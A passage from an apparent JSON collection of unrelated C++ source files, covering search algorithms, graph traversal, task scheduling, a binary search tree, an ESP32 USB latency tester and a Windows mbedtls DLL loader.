customer;\r\n        }\r\n    }\r\n    if (topMessenger) {\r\n        outputFile << topMessenger->getName() << \": \" << topMessenger->getTotalMessageSent() << \"\\n\";\r\n    }\r\n\r\n    Customer* topInternetUser = nullptr;\r\n    for (auto& customer : customers) {\r\n        if (!topInternetUser || customer->getTotalInternetUsage() > topInternetUser->getTotalInternetUsage() ||\r\n            (customer->getTotalInternetUsage() ",
    "// #include <iostream>\r\n\r\n// using namespace std;\r\n\r\n// int binary(int a[],int n,int key){\r\n//     int start = 0;\r\n//     int end = n-1;\r\n//     int mid = start + (end - start)/2;\r\n\r\n//     while(start <= end){\r\n\r\n//         if(a[mid]==key){\r\n//             return a[mid];\r\n//         }\r\n\r\n//         if(key > a[mid]){\r\n//             start = mid + 1;\r\n//         }\r\n//         else{\r\n//             end = mid - 1;\r\n//         }\r\n//         mid = start + (end - start)/2;\r\n//     }\r\n    \r\n//     return -1;\r\n// }\r\n\r\n\r\n// int main (){\r\n//     int n;\r\n//     cin>> n;\r\n//     int a[n];\r\n//     for(int i =0;i<n;i++){\r\n//         cin>> a[i];\r\n//     }\r\n//     int key;\r\n//     cin>> key;\r\n//     int ans = binary(a,n,key);\r\n//     cout<< ans;\r\n// }\r\n\r\n\r\n\r\n\r\n\r\n// First & Last element of an array\r\n\r\n\r\n// int firstOccurence(int a[],int n,int key){\r\n//     int store = 0;\r\n//     int start = 0;\r\n//     int end = n-1;\r\n//     int mid = start + ((end - start)/2);\r\n//     while(start<=end){\r\n//         if(a[mid] == key){\r\n//             store = mid;\r\n//             end = mid - 1;\r\n//         }\r\n//         else if(key > a[mid]){\r\n//         start = mid + 1;\r\n//         }\r\n//         else{\r\n//         end = mid - 1;\r\n//         }\r\n//         mid = start + ((end - start)/2);\r\n//     }\r\n//     return store;\r\n// }\r\n\r\n// int lastOccurence(int a[],int n,int key){\r\n//     int store = 0;\r\n//     int start = 0;\r\n//     int end = n-1;\r\n//     int mid = start + ((end - start)/2);\r\n//     while(start<=end){\r\n//         if(a[mid] == key){\r\n//             store = mid;\r\n//             start = mid + 1;\r\n//         }\r\n//         else if(key > a[mid]){\r\n//         start = mid + 1;\r\n//         }\r\n//         else{\r\n//         end = mid - 1;\r\n//         }\r\n//         mid = start + ((end - start)/2);\r\n//     }\r\n//     return store;\r\n// }\r\n\r\n\r\n// #include <iostream>\r\n// using namespace std;\r\n// int main(){\r\n//     int n;\r\n//     cin>> n;\r\n//     int a[n];\r\n//     for(int i =0;i<n;i++){\r\n//         cin>> a[i];\r\n//     }\r\n//     int key;\r\n//     cin>> key;\r\n//     int ans = firstOccurence(a,n,key);\r\n//     int ans1 = lastOccurence(a,n,key);\r\n//     cout<<\"first occurence at index : \" << ans << endl;\r\n//     cout<<\"Last occurence at index : \" << ans1;\r\n// }\r\n\r\n\r\n\r\n// Find total no. of occurence \r\n\r\n// int firstOccurence(int a[],int n,int key){\r\n//     int store = 0;\r\n//     int start = 0;\r\n//     int end = n-1;\r\n//     int mid = start + ((end - start)/2);\r\n//     while(start<=end){\r\n//         if(a[mid] == key){\r\n//             store = mid;\r\n//             end = mid - 1;\r\n//         }\r\n//         else if(key > a[mid]){\r\n//         start = mid + 1;\r\n//         }\r\n//         else{\r\n//         end = mid - 1;\r\n//         }\r\n//         mid = start + ((end - start)/2);\r\n//     }\r\n//     return store;\r\n// }\r\n\r\n// int lastOccurence(int a[],int n,int key){\r\n//     int store = 0;\r\n//     int start = 0;\r\n//     int end = n-1;\r\n//     int mid = start + ((end - start)/2);\r\n//     while(start<=end){\r\n//         if(a[mid] == key){\r\n//             store = mid;\r\n//             start = mid + 1;\r\n//         }\r\n//         else if(key > a[mid]){\r\n//         start = mid + 1;\r\n//         }\r\n//         else{\r\n//         end = mid - 1;\r\n//         }\r\n//         mid = start + ((end - start)/2);\r\n//     }\r\n//     return store;\r\n// }\r\n\r\n// #include <iostream>\r\n// using namespace std;\r\n// int main(){\r\n//     int n;\r\n//     cin>> n;\r\n//     int a[n];\r\n//     for(int i =0;i<n;i++){\r\n//         cin>> a[i];\r\n//     }\r\n//     int key;\r\n//     cin>> key;\r\n//     int ans = firstOccurence(a,n,key);\r\n//     int ans1 = lastOccurence(a,n,key);\r\n//     int total = (ans1 - ans) + 1;\r\n//     cout<<\"Total occurence are : \" << total << endl;\r\n// }\r\n\r\n\r\n\r\n// peak index of a mountain array\r\n\r\n\r\n// int peak (int a[], int n){\r\n//     int start = 0;\r\n//     int end = n - 1; \r\n//     int mid = start + ((end - start)/2);\r\n//     while(start < end){\r\n//         if(a[mid] < a[mid + 1]){\r\n//             start = mid + 1;\r\n//         }\r\n//         else{\r\n//             end = mid ;\r\n//         }\r\n//     mid = start + ((end - start)/2);\r\n//     }\r\n//     return start;\r\n// }\r\n\r\n\r\n// #include <iostream>\r\n// using namespace std ;\r\n// int main(){\r\n//     int n;\r\n//     cin>> n;\r\n//     int a[n];\r\n//     for(int i =0;i<n;i++){\r\n//         cin>> a[i];\r\n//     }\r\n//     int ans = peak(a,n);\r\n//     cout << \"Peak is here :) \" << ans;\r\n// }\r\n\r\n\r\n\r\n// pivot index of an array \r\n\r\n// #include <iostream>\r\n// using namespace std;\r\n\r\n// int pivotelement(int a[],int n){\r\n//     int start = 0;\r\n//         int end = n - 1;\r\n//         int mid = start + ((end - start)/2);\r\n//         while(start<end){\r\n//             if(a[mid] >= a[0]){\r\n//                 start =  mid + 1;\r\n//             }\r\n//             else{\r\n//                 end = mid;\r\n//             }\r\n//         mid = start + ((end - start)/2);\r\n//         }\r\n//         return start;\r\n//     }\r\n\r\n\r\n// int main (){\r\n//     int n;\r\n//     cin>> n;\r\n//     int a[n];\r\n//   ",
    "// \u041d\u0430\u0439\u0442\u0438 \u0441\u0443\u043c\u043c\u0443 \u043c\u0438\u043d\u0438\u043c\u0443\u043c\u043e\u0432 \u043a\u0430\u0436\u0434\u043e\u0439 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u044b \u0441\u0432\u044f\u0437\u043d\u043e\u0441\u0442\u0438\n\n#include <iostream>\n#include <vector>\n#include <cstdint>\nusing namespace std;\n\n#pragma GCC optimize(\"Ofast,unroll-loops\")\n#pragma GCC optimize(\"inline\")\n#define int long long\n\nvector<int> gr[100005];\nbool visited[100005];\nvector<int> a;\n\nint dfs(int v) {\n    int min_cost = a[v];\n    visited[v] = true;\n    for (int u : gr[v]) {\n        if (!visited[u]) {\n            min_cost = min(min_cost, dfs(u));\n        }\n    }\n    return min_cost;\n}\n\nint32_t main() {\n    ios_base::sync_with_stdio(false);\n    cin.tie(nullptr);\n    cout.tie(nullptr);\n    int n, m;\n    cin >> n >> m;\n    a.resize(n);\n\n    for (int i = 0; i < n; ++i) {\n        cin >> a[i];\n    }\n\n    for (int i = 0; i < m; ++i) {\n        int u, v;\n        cin >> u >> v;\n        u--; v--;\n        gr[u].push_back(v);\n        gr[v].push_back(u);\n    }\n\n    int ans = 0;\n    for (int i = 0; i < n; ++i) {\n        if (!visited[i]) {\n            ans += dfs(i);\n        }\n    }\n    cout << ans << \"\\n\";\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <bits/stdc++.h>\r\n//#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Job{\r\nint id;\r\nstring name;\r\nint duration;\r\n};\r\nvector<Job> j_vec;\r\n    Job job;\r\n\r\nstruct Profit{\r\nJob tasks;\r\nint deadline;\r\nint profit;\r\n};\r\nvector<Profit>p_tasks;\r\n\r\nstruct Priority{\r\nJob tasks;\r\nint deadline;\r\nint priority;\r\n};\r\nvector<Priority>pr_tasks;\r\n\r\nstruct Maxjob{\r\nJob tasks;\r\nint deadline;\r\n};\r\nvector<Maxjob>m_tasks;\r\n\r\nbool comparison(Profit a , Profit b){\r\nreturn (a.profit>b.profit);\r\n}\r\n\r\nbool compare(Priority a, Priority b){\r\n    return (a.priority<b.priority);\r\n}\r\n\r\nbool comp(Maxjob a, Maxjob b){\r\n    return (a.deadline>b.deadline);\r\n}\r\n\r\nvoid computeLPSArray(const string& pat, vector<int>& lps) {\r\n    int M = pat.size();\r\n    int len = 0;\r\n    lps[0] = 0;\r\n    int i = 1;\r\n\r\n    while (i < M) {\r\n        if (pat[i] == pat[len]) {\r\n            len++;\r\n            lps[i] = len;\r\n            i++;\r\n        } else {\r\n            if (len != 0) {\r\n                len = lps[len - 1];\r\n            } else {\r\n                lps[i] = 0;\r\n                i++;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n// Function to convert string to lowercase\r\nstring toLowercase(const string& str) {\r\n    string lowercaseStr = str;\r\n    for (char& c : lowercaseStr) {\r\n        if (c >= 'A' && c <= 'Z') {\r\n            c = c + ('a' - 'A');\r\n        }\r\n    }\r\n    return lowercaseStr;\r\n}\r\n\r\nvoid KMPSearch(const string& pat) {\r\n    vector<string> matchingStrings;\r\n    int M = pat.size();\r\n    int N;\r\n\r\n    string patternLower = toLowercase(pat);\r\n\r\n    vector<int> lps(M);\r\n    computeLPSArray(patternLower, lps);\r\n\r\n    for (const Job& job : j_vec) {\r\n        string textLower = toLowercase(job.name);\r\n        N = job.name.size();\r\n        int i = 0, j = 0;\r\n        while (i < N) {\r\n            if (patternLower[j] == textLower[i]) {\r\n                j++;\r\n                i++;\r\n            }\r\n\r\n            if (j == M) {\r\n                matchingStrings.push_back(job.name);\r\n                j = lps[j - 1];\r\n            } else if (i < N && patternLower[j] != textLower[i]) {\r\n                if (j != 0)\r\n                    j = lps[j - 1];\r\n                else\r\n                    i = i + 1;\r\n            }\r\n        }\r\n    }\r\n\r\n    if (matchingStrings.empty()) {\r\n        cout << \"No matching task found!\" << endl;\r\n    } else {\r\n        cout << \"Tasks with name pattern matching:\" << endl;\r\n        for (const string& str : matchingStrings)\r\n            cout << str << endl;\r\n    }\r\n}\r\n\r\n\r\nvoid binpack(int n, int dur) {\r\n    vector<vector<int>> bins(n);\r\n    vector<int> remainingSpace(n, dur);\r\n\r\n    for (const auto& d : j_vec) {\r\n        int weight=d.duration;\r\n        int maxSpaceIndex = 0;\r\n        int maxSpace = remainingSpace[0];\r\n\r\n        for (int i = 1; i < n; ++i) {\r\n            if (remainingSpace[i] > maxSpace) {\r\n                maxSpace = remainingSpace[i];\r\n                maxSpaceIndex = i;\r\n            }\r\n        }\r\n\r\n        if (maxSpace >= weight) {\r\n            bins[maxSpaceIndex].push_back(weight);\r\n            remainingSpace[maxSpaceIndex] -= weight;\r\n        } else {\r\n            cout << \"Task \" << d.name << \" cannot be alloted to any worker.\" << endl;\r\n        }\r\n    }\r\n\r\n    for (int i = 0; i < n; ++i) {\r\n        cout << \"Worker \" << i + 1 << \": \";\r\n        for (int weight : bins[i]) {\r\n            cout << weight << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nvoid robin(queue<pair<string, int> >& t, int n) {\r\n    for (int s = 1; s <= n; ++s) {\r\n        if (t.empty()) {\r\n            cout << \"No tasks remaining.\" << endl;\r\n            return;\r\n        }\r\n        string c = t.front().first;\r\n        int d = t.front().second;\r\n        //cout << \"Slot \" << s << \": \" << c << endl;\r\n            cout<<\"start time: \"<<s-1<<\"--\"<<\"end time: \"<<s<<\"   task: \"<<c<<\" \"<<endl;\r\n        --d;\r\n        if (d <= 0) {\r\n            t.pop();\r\n        } else {\r\n            t.push(make_pair(c, d));\r\n            t.pop();\r\n        }\r\n    }\r\n}\r\n\r\nvoid round_robin(queue<pair<string, int> >& ts, int workers, int dur) {\r\n    vector<string> wts(workers, \"\");\r\n    vector<int> rwts(workers, dur);\r\n\r\n    while (!ts.empty()) {\r\n        string cur_task = ts.front().first;\r\n        int task_dur = ts.front().second;\r\n        ts.pop();\r\n\r\n        int max_avail_time = -1;\r\n        int worker_ind = -1;\r\n        for (int i = 0; i < workers; ++i) {\r\n            if (rwts[i] >= task_dur && rwts[i] > max_avail_time) {\r\n                max_avail_time = rwts[i];\r\n                worker_ind = i;\r\n            }\r\n        }\r\n\r\n        if (worker_ind != -1) {\r\n            wts[worker_ind] += cur_task + \" \";\r\n            rwts[worker_ind] -= task_dur;\r\n            cout << \"Assigned task '\" << cur_task << \"' to Worker \" << worker_ind + 1 << endl;\r\n        } else {\r\n            cout << \"Task '\" << cur_task << \"' could not be assigned to any worker.\" << endl;\r\n        }\r\n    }\r\n\r\n    \r\n}\r\n\r\nvoid priority_sched(int num){\r\n   ",
    "/*\nCode Output\n\n    Enter the value of n5\n       *       \n      ***      \n     *****     \n     @   @     \n     @   @     \n     @   @     \n*****@   @*****\n ***       *** \n  *         *  \n    \n\n*/\n\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nint main() {\n    int n;\n    cout<<\"Enter the value of n\";\n    cin>>n;\n    int row=(2*n)+n-2;\n    int col=n*3;\n    vector<vector<char>>mat(row,vector<char>(col,' '));\n    int i;\n    int k=0;\n    int oddcount=1;\n    for(i=0;i<row;i++)\n    {\n        if(i>=0 && i<(n/2)+1){\n        int count=0;\n        int j=(col/2)-k;\n        while(count<oddcount)\n        {\n            mat[i][j]='*';\n            count++;\n            j++;\n        }\n        oddcount+=2;\n        k++;\n        }\n        else if(i>=(n/2)+1 && i<=(n/2)+n-1)\n        {\n        mat[i][col/3]='@';\n        mat[i][(col/3)+n-1]='@';\n        }\n        \n    }\n    i=(n/2)+1;\n    k=n;\n    oddcount=n;\n    for(i=(n/2)+n-1;i<row;i++)\n    {\n        int count=0;\n        int j=(col/3)-k;\n        int endj=j+2*n;\n        while(count<oddcount)\n        {\n            mat[i][j]='*';\n            mat[i][endj]='*';\n            j++;\n            endj++;\n            count++;\n        }\n        oddcount-=2;\n        k--;\n    }\n    for(int i=0;i<mat.size();i++)\n    {\n        for(int j=0;j<mat[0].size();j++)\n        {\n            cout<<mat[i][j];\n        }\n        cout<<endl;\n    }\n    return 0;\n}\n",
    "#include<iostream>\n\nusing namespace std;\n//\u5b9a\u4e49\u8282\u70b9\u7ed3\u6784\ntypedef struct BSTNode\n{\n\tint data;\n\tstruct BSTNode* left;\n\tstruct BSTNode* right;\n\n}Node;\n\n\n//\u521b\u5efa\u65b0\u8282\u70b9\nNode* createNode(int data)\n{\n\tNode* newNode = new Node;\n\tnewNode->data = data;\n\tnewNode->left = NULL;\n\tnewNode->right = NULL;\n\n\treturn newNode;\n}\n\n//\u63d2\u5165\u8282\u70b9\nNode* insertBSTNode(Node* root,int data)\n{\n\tif (root == NULL)\n\t{\n\t\treturn createNode(data);\n\t}\n\tif (data < root->data)\n\t{\n\t\troot->left = insertBSTNode(root->left, data);\n\t}\n\telse if (data > root->data)\n\t{\n\t\troot->right = insertBSTNode(root->right, data);\n\t}\n\n\treturn root;\n}\n\n//\u627e\u5230\u6700\u5c0f\u8282\u70b9\nNode* findMin(Node* root)\n{\n\twhile (root->left != NULL)\n\t{\n\t\troot = root->left;\n\t}\n\treturn root;\n}\n\n\n//\u5220\u9664\u8282\u70b9\nNode* deleteNode(Node* root, int data)\n{\n\tif (root == NULL) return root;\n\n\tif (data < root->data)\n\t{\n\t\troot->left = deleteNode(root->left,data);\n\t}\n\telse if (data > root->data)\n\t{\n\t\troot->right = deleteNode(root->right, data);\n\t}\n\telse\n\t{\n\t\t//\u627e\u5230\u4e86\n\t\tif (root->left == NULL)\n\t\t{\n\t\t\tNode* temp = root->right;\n\t\t\tdelete(root);\n\t\t\treturn temp;\n\t\t}\n\t\telse if (root->right == NULL)\n\t\t{\n\t\t\tNode* temp = root->left;\n\t\t\tdelete(root);\n\t\t\treturn temp;\n\t\t}\n\t\t//\u5982\u679c\u5de6\u53f3\u8282\u70b9\u90fd\u5b58\u5728\n\t\tNode* temp = findMin(root->right); //\u627e\u5230\u8be5\u8282\u70b9\u7684\u540e\u7ee7\u7684\u6700\u5c0f\u8282\u70b9\n\t\troot->data = temp->data;\n\t\troot->right= deleteNode(root->right,temp->data);\n\t}\n\treturn root;\n}\n\n\n//\u4e2d\u5e8f\u904d\u5386\nvoid inorderTraversal(Node* root)\n{\n\tif (root != NULL)\n\t{\n\t\tinorderTraversal(root->left);\n\t\tcout << root->data << \" \";\n\t\tinorderTraversal(root->right);\n\t}\n}\n\n\n\n//BST\u7684\u751f\u6210\nNode* generateBST(int* data, int size)\n{\n\tNode* root = NULL;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\troot = insertBSTNode(root,data[i]);\n\t}\n\treturn root;\n}\n\n\n\nint main() {\n\tint data[] = { 23,54,67,13,33,78,91 };\n\tint size = sizeof(data) / sizeof(data[0]);\n\n\tNode* root = generateBST(data, size);\n\n\n\tstd::cout << \"\u4e2d\u5e8f\u904d\u5386: \";\n\tinorderTraversal(root);\n\tstd::cout << std::endl;\n\n\tstd::cout << \"\u63d2\u5165\u8282\u70b9 25:\\n\";\n\tinsertBSTNode(root, 25);\n\tinorderTraversal(root);\n\tstd::cout << std::endl;\n\n\tstd::cout << \"\u5220\u9664\u8282\u70b9 23:\\n\";\n\troot = deleteNode(root, 23);\n\tinorderTraversal(root);\n\tstd::cout << std::endl;\n\n\tstd::cout << \"\u5220\u9664\u8282\u70b9 33:\\n\";\n\troot = deleteNode(root, 33);\n\tinorderTraversal(root);\n\tstd::cout << std::endl;\n\n\tstd::cout << \"\u5220\u9664\u8282\u70b9 25:\\n\";\n\troot = deleteNode(root, 25);\n\tinorderTraversal(root);\n\tstd::cout << std::endl;\n\n\n\treturn 0;\n}\n",
    "#include <atomic>\n#include <chrono>\n#include <thread>\n\n#include <driver/gpio.h>\n\n#include \"usb/usb_host.h\"\n#include \"usb/hid_host.h\"\n#include \"usb/hid_usage_keyboard.h\"\n#include \"usb/hid_usage_mouse.h\"\n\n#include \"logger.hpp\"\n#include \"task.hpp\"\n\nusing namespace std::chrono_literals;\n\nstatic espp::Logger logger({.tag = \"esp-usb-latency-test\", .level = espp::Logger::Verbosity::INFO});\n\nenum class ControllerType {\n  UNKNOWN,\n  SONY,\n  XBOXONE,\n  XBOX360,\n  SWITCH_PRO,\n  BACKBONE,\n  EIGHTBITDO, // NOTE: use 'D' compatibility setting\n};\n\n// array of report byte indexes for each controller type that should be checked\n// for changes, or -1 if the controller only reports changes. For now we'll\n// enforce that we only check the button bytes, so it cannot be more than 2\n// bytes, or 16 bits.\nstatic const int report_bytes[][2] = {\n  { 0, 0 }, // UNKNOWN\n  { 8, 9 }, // SONY\n  { 0, 0 }, // XBOXONE\n  { 0, 0 }, // XBOX360\n  { 0, 0 }, // SWITCH_PRO\n  { 12, 13 }, // BACKBONE\n  { 8, 9 }, // EIGHTBITDO; NOTE: use 'D' compatibility setting\n};\n\n// for libfmt printing of gpio_num_t\ntemplate <> struct fmt::formatter<gpio_num_t> : fmt::formatter<std::string> {\n  template <typename FormatContext> auto format(gpio_num_t t, FormatContext &ctx) const {\n    return fmt::format_to(ctx.out(), \"GPIO_NUM_{}\", (int)t);\n  }\n};\n\n// for libfmt printing of ControllerType\ntemplate <> struct fmt::formatter<ControllerType> : fmt::formatter<std::string> {\n  template <typename FormatContext> auto format(ControllerType t, FormatContext &ctx) const {\n    switch (t) {\n    case ControllerType::UNKNOWN:\n      return fmt::format_to(ctx.out(), \"UNKNOWN\");\n    case ControllerType::SONY:\n      return fmt::format_to(ctx.out(), \"Sony\");\n    case ControllerType::XBOXONE:\n      return fmt::format_to(ctx.out(), \"Xbox One\");\n    case ControllerType::XBOX360:\n      return fmt::format_to(ctx.out(), \"Xbox 360\");\n    case ControllerType::SWITCH_PRO:\n      return fmt::format_to(ctx.out(), \"Nintendo Switch Pro\");\n    case ControllerType::BACKBONE:\n      return fmt::format_to(ctx.out(), \"Backbone\");\n    case ControllerType::EIGHTBITDO:\n      return fmt::format_to(ctx.out(), \"8BitDo\");\n    default:\n      return fmt::format_to(ctx.out(), \"UNKNOWN\");\n    }\n  }\n};\n\n// button pin configuration\nstatic constexpr gpio_num_t button_pin = (gpio_num_t)CONFIG_BUTTON_GPIO;\nstatic int BUTTON_PRESSED_LEVEL = 1;\nstatic int BUTTON_RELEASED_LEVEL = !BUTTON_PRESSED_LEVEL;\n\n// button press/release timing configuration\nstatic uint64_t button_press_start = 0;\nstatic uint64_t button_release_start = 0;\nstatic uint64_t latency_us = 0;\nstatic constexpr uint64_t IDLE_US = 50 * 1000; // time between button presses\nstatic constexpr uint64_t HOLD_TIME_US = CONFIG_BUTTON_HOLD_TIME_MS * 1000;\nstatic constexpr uint64_t MAX_SHIFT_MS = CONFIG_MAX_BUTTON_DELAY_MS;\n\n// used for notifying the HID task to check the latency\nstatic TaskHandle_t hid_task_handle_ = NULL;\n\n// randomly shift the button press time within the 1s period\nstatic int shift = 0;\n\n// what device is connected\nstatic std::atomic<bool> connected = false;\nstatic std::string connected_manufacturer = \"\";\nstatic std::string connected_product = \"\";\nstatic std::atomic<ControllerType> connected_controller_type = ControllerType::UNKNOWN;\n\n// HID signaling events for the callback functions\nQueueHandle_t app_event_queue = NULL;\ntypedef enum {\n  APP_EVENT_HID_HOST = 0\n} app_event_group_t;\ntypedef struct {\n  app_event_group_t event_group;\n  /* HID Host - Device related info */\n  struct {\n    hid_host_device_handle_t handle;\n    hid_host_driver_event_t event;\n    void *arg;\n  } hid_host_device;\n} app_event_queue_t;\n\n// HID Host Device callback functions\nstatic uint16_t last_button_state = 0;\nstatic bool check_report_changed(const uint8_t *const data, const int length);\nstatic void hid_host_generic_report_callback(const uint8_t *const data, const int length);\nstatic void hid_host_interface_callback(hid_host_device_handle_t hid_device_handle,\n                                        const hid_host_interface_event_t event,\n                                        void *arg);\nstatic void hid_host_device_event(hid_host_device_handle_t hid_device_handle,\n                                  const hid_host_driver_event_t event,\n                                  void *arg);\nstatic void hid_host_device_callback(hid_host_device_handle_t hid_device_handle,\n                                     const hid_host_driver_event_t event,\n                                     void *arg);\nstatic void usb_lib_task(void *arg);\n\n// main code\nextern \"C\" void app_main(void) {\n  static auto start = std::chrono::high_resolution_clock::now();\n  static auto elapsed = [&]() {\n    auto now = std::chrono::high_resolution_clock::now();\n    return std::chrono::duration<float>(now - start).count();\n  };\n\n  logger.info(\"Bootup\");\n\n  logger.info(\"Setting up button GPIO: {}\", button_pin);\n  gpio_set_direction(button_pin, GPIO_MODE_OUTPUT);\n  gpio_set_level(button_pin, BUTTON_RELEASED_LEVEL);\n\n  // set",
    "/*\nPREVIOUS GREATER ELEMENT USING STACK\n\nAn Efficient Approach to find Previous Greater Element for every \nelement in an array. Given an array of Distinct Integers, find closest \n(Positive-Wise) greater on left of every element. If there is no \ngreater element on left then print -1.\n*/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n/* This function is used to check if top of the \nstack is smaller we remove it or if top is \ngreater, then this element is previous greater\nelement and print it.\n*/\n\nvoid printPrevGreater(int arr[],int n){\n    //Stack to store Previous Greater on top of stack.\n    stack<int>s;\n\n    /*Store first element of array to \n    check if top item is smaller then\n    current item.*/\n    s.push(arr[0]);\n\n    /* This loop will help to find the \n       previous greater element from \n       the current value and simply print\n       it and if not found print -1.\n       NOTE : After every iteration whatever the remaining element is \n       present at the top is Previous Greater and if stack is empty\n       then previous Greater is -1. \n    */\n    for(int i=0;i<n;i++){\n        while(s.empty()==false && s.top()<=arr[i])\n            s.pop();\n\n        //pg : Previous Greater\n        int pg=s.empty()?-1:s.top();\n        cout<<pg<<\" \";\n        s.push(arr[i]);\n    }\n}\n// Driver's Code\nint main() \n{ \n    int n;\n    cout<<\"Accept the value : \";\n    cin>>n;\n    int arr[n];\n    cout<<\"Accept the array elements : \";\n    for(int i=0;i<n;i++){\n        cin>>arr[i];\n    }\n    cout<<\"Next Greater Elements : \";\n    printPrevGreater(arr,n);\n    return 0; \n}\n/*\nINPUT AND OUTPUT\nAccept the value : 5\nAccept the array elements : 20 30 10 5 15\n\nNext Greater Elements : -1  -1  30  10 30\n\nTime Complexity: O(n)\n*/",
    "#include <QCoreApplication>\n#include <windows.h>\n#include <iostream>\n#include \"transit_def.h\"\n#include \"mbedtl_def.h\"\n#include <synchapi.h>\n//#include <winsock2.h>\n\n#pragma comment(lib,\"WS2_32\")\n\n\nint mbedtl()\n{\n    // \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0443\u0432\u0430\u043d\u043d\u044f \u0437\u0432\u0438\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0440\u044f\u0434\u043a\u0430 \u0432 \u0448\u0438\u0440\u043e\u043a\u0438\u0439 \u0440\u044f\u0434\u043e\u043a\n    const wchar_t* wDllName = L\"mbedtls.dll\";\n\n    WSADATA wsaData;\n\n    BYTE res;\n    CryptoSet_t ServerCripto;\n    BYTE Server_priv_key[20];\n    BYTE Server_priv_algo;\n    BYTE Server_auth_key[20];\n    BYTE Server_auth_algo;\n\n    PRGETUSER hGetUser;\n    PRDECRIPTIONPROC hDecryptionProc;\n    PRENCRIPTIONPROC hEncryptionProc;\n    HANDLE hMutexDecryption;\n    HANDLE hMutexEncryption;\n\n    SYSTEM_INFO\tSystemInfo;\n    HANDLE ghWorkHeap;\n\n    // \u0417\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0435\u043d\u043d\u044f \u0431\u0456\u0431\u043b\u0456\u043e\u0442\u0435\u043a\u0438 \u0437 \u0432\u0438\u043a\u043e\u0440\u0438\u0441\u0442\u0430\u043d\u043d\u044f\u043c LoadLibraryW\n    HINSTANCE hMbedTl = LoadLibraryW(wDllName);\n    if (!hMbedTl) {\n        DWORD errorCode = GetLastError();\n        wchar_t errorMsg[256];\n        swprintf_s(errorMsg, 256, L\"Could not open file!\\n mbedtls.dll\\nError code: %lu\", errorCode);\n        MessageBoxW(GetConsoleWindow(), errorMsg, L\"Error\", MB_ICONERROR | MB_OK);\n        return -1;\n    }\n    hGetUser = (PRGETUSER)GetProcAddress(hMbedTl, \"prGetUser\");\n    if (hGetUser) {\n        res = (hGetUser)((char*)ServerCripto.user_name, NULL, NULL, &Server_priv_algo, Server_priv_key, &ServerCripto);\n        res = (hGetUser)((char*)ServerCripto.user_name, &Server_auth_algo, Server_auth_key, NULL, NULL, &ServerCripto);\n    } else {\n        DWORD errorCode = GetLastError();\n        wchar_t errorMsg[256];\n        swprintf_s(errorMsg, 256, L\"Could not GetProcAddress prGetUser\\nError code: %lu\", errorCode);\n        MessageBoxW(GetConsoleWindow(), errorMsg, L\"Error\", MB_ICONERROR | MB_OK);\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n    hDecryptionProc = (PRDECRIPTIONPROC)GetProcAddress(hMbedTl, \"prDecryptionProc\");\n    if (hDecryptionProc == NULL) {\n        DWORD errorCode = GetLastError();\n        wchar_t errorMsg[256];\n        swprintf_s(errorMsg, 256, L\"Could not GetProcAddress prDecryptionProc\\nError code: %lu\", errorCode);\n        MessageBoxW(GetConsoleWindow(), errorMsg, L\"Error\", MB_ICONERROR | MB_OK);\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n    hEncryptionProc = (PRENCRIPTIONPROC)GetProcAddress(hMbedTl, \"prEncryptionProc\");\n    if (hEncryptionProc == NULL) {\n        DWORD errorCode = GetLastError();\n        wchar_t errorMsg[256];\n        swprintf_s(errorMsg, 256, L\"Could not GetProcAddress prEncryptionProc\\nError code: %lu\", errorCode);\n        MessageBoxW(GetConsoleWindow(), errorMsg, L\"Error\", MB_ICONERROR | MB_OK);\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n        std::cout << \"WSAStartup() returned error code \" << (unsigned int)GetLastError() << std::endl;\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n    GetSystemInfo(&SystemInfo);\n    ghWorkHeap = HeapCreate(HEAP_NO_SERIALIZE, SystemInfo.dwPageSize*300,SystemInfo.dwPageSize*350);\n    if (ghWorkHeap == NULL) {\n        std::cout << \"Failed to create Heap!\\nError=\" << (unsigned int)GetLastError() << std::endl;\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n\n    // \u041c\u044e\u0442\u0435\u043a\u0441\u0438 \u043d\u0430 \u0437\u0432\u0435\u0440\u043d\u0435\u043d\u043d\u044f \u0434\u043e \u043f\u043e\u0440\u0442\u0430 \u0415\u0437\u0435\u0440\u043d\u0435\u0442 \u0456 \u043d\u0430 \u0448\u0438\u0444\u0440\u0443\u0432\u0430\u043d\u043d\u044f/\u0434\u0435\u0448\u0438\u0444\u0440\u0443\u0432\u0430\u043d\u043d\u044f\n    hMutexDecryption = CreateMutex(NULL, FALSE, L\"prDecryptionProc\");\n    if (hMutexDecryption == NULL) {\n        printf(\"Failed to create mutex!\\nError=%d\", (unsigned int)GetLastError());\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n    hMutexEncryption = CreateMutex(NULL, FALSE, L\"prEncryptionProc\");\n    if (hMutexEncryption == NULL) {\n        printf(\"Failed to create mutex!\\nError=%d\", (unsigned int)GetLastError());\n        FreeLibrary(hMbedTl);\n        return -1;\n    }\n\n    // \u0412\u0438\u043a\u043b\u0438\u043a \u0444\u0443\u043d\u043a\u0446\u0456\u0457\n    //ExampleFunction();\n    std::cout << \"hello\" << std::endl;\n    // \u0412\u0438\u0432\u0430\u043d\u0442\u0430\u0436\u0435\u043d\u043d\u044f \u0431\u0456\u0431\u043b\u0456\u043e\u0442\u0435\u043a\u0438\n    FreeLibrary(hMbedTl);\n\n    return 0;\n}\n",
